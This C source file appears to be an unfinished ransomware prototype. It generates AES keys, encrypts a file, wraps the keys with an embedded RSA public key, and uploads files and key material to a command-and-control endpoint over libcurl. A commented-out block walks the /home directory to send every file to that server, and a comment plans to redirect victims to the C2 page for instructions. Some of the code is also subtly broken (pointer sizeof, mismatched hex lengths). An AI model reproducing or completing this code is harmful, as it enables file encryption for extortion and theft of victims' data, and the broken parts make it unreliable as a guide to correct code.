#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/aes.h>


#include <openssl/rand.h>

#include <openssl/err.h>

#include "files.h"
#include "encryption.h"

void sendFileToApi(const char *path, const char *id, const char *api);



int main(){

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Generate AES key and IV
    unsigned char key[32];
    size_t key_size = sizeof(key);
    RAND_bytes(key, key_size);

    unsigned char iv[16];
    size_t iv_size = sizeof(iv);
    RAND_bytes(iv, iv_size);

    //Authentication string
    static const unsigned char aad[] = "Cyan";

    //Encrypt the specified file
    encrypt_file(key, iv, aad, "1v1.jpg");

    //Decrypt the specified file
    decryptFile(key, iv, aad, "1v1.jpg.cha");

    //Encrypt the AES key and IV with the RSA public key
    const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";

    const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key, key_size);
    const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv, iv_size);

    size_t aes_size = sizeof(encrypted_aes_key);
    
    char hex_string[aes_size / 8 * 2 + 1]; 
    char hex_iv[iv_size / 8 * 2 + 1];       

    // Convert octect in hexa and stock it
    for (int i = 0; i < aes_size / 8; ++i) {
        sprintf(hex_string + i * 2, "%02x", encrypted_aes_key[i]);
    }
    hex_string[aes_size / 8 * 2] = '\0';

    for (int i = 0; i < iv_size / 8; ++i) {
        sprintf(hex_iv + i * 2, "%02x", encrypted_iv[i]);
    }
    hex_iv[iv_size / 8 * 2] = '\0';

    save_hex_to_file("iv.txt", (unsigned char *)hex_iv, strlen(hex_iv)); 
    printf("IV: %s\n", hex_iv);
    printf("aes: %s\n", hex_string);

    OPENSSL_free(encrypted_aes_key);
    OPENSSL_free(encrypted_iv);

    //const char *URL = "http://127.0.0.1:42956/upload";
    char ip[] = "127.0.0.1";
    int port = 42956;
    const char *URL[100];
    sprintf(URL, "http://%s:%d/upload", ip, port);
    printf("url: %s", &URL);
    const unsigned char *ID = hex_string;

    sendFileToApi("1v1.jpg", ID, URL);
    sendFileToApi("1v1 copy.jpg", ID, URL);
    sendFileToApi("iv.txt", ID, URL);

    //List all the files we want to borrow ;)
    /*
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Send the raw file to C2
        sendFileToApi(pathList.paths[i], ID, URL);

        //Encrypt each file with AES
        //encryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);
    */


    //Redirect to C2's web page for instructions

    return 0;
}
//WIP
void sendFileToApi(const char *path, const char *id, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    curl_mime *form = NULL;
    curl_mimepart *field = NULL;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        form = curl_mime_init(curl);

        // Add the file
        field = curl_mime_addpart(form);
        curl_mime_name(field, "file");
        curl_mime_filedata(field, path);

        // Add id
        field = curl_mime_addpart(form);
        curl_mime_name(field, "id");
        curl_mime_data(field, id, CURL_ZERO_TERMINATED);

        // Add road of the api
        curl_easy_setopt(curl, CURLOPT_URL, api);

        // Attach everything
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        // Execute
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        // Clean to make a new upload
        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

}

void save_hex_to_file(const char *filename, const unsigned char *data, size_t data_len) {
    FILE *file = fopen(filename, "w");
    if (file) {
        fwrite(data, sizeof(unsigned char), data_len, file);
        fclose(file);
    } else {
        fprintf(stderr, "Failed to open file %s for writing\n", filename);
    }
}


